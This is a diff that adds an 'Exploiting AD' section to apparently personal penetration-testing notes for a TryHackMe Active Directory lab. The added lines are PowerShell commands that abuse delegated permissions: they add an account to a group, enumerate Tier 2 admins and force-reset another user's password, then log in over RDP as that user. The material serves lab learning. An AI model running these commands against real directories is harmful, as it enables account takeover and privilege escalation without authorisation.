@@ -290,6 +290,25 @@ olcSaslSecProps: noanonymous,minssf=0,passcred
   - bloodhound
     - import looted files
 
+## Exploiting AD
+
+### Delegating Permission
+- Add account to group member
+```
+Add user to group ==> Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username" 
+
+check group ==> Get-ADGroupMember -Identity "IT Support" 
+
+Find users ==> Get-ADGroupMember -Identity "Tier 2 Admins"
+
+Force Change Password:
+- $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
+- Set-ADAccountPassword -Identity "t2_henry.shaw" -Reset -NewPassword $Password 
+
+Connect to user
+xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'t2.admin' /p:'newpass'
+```
+
 
 
 # COMMANDS
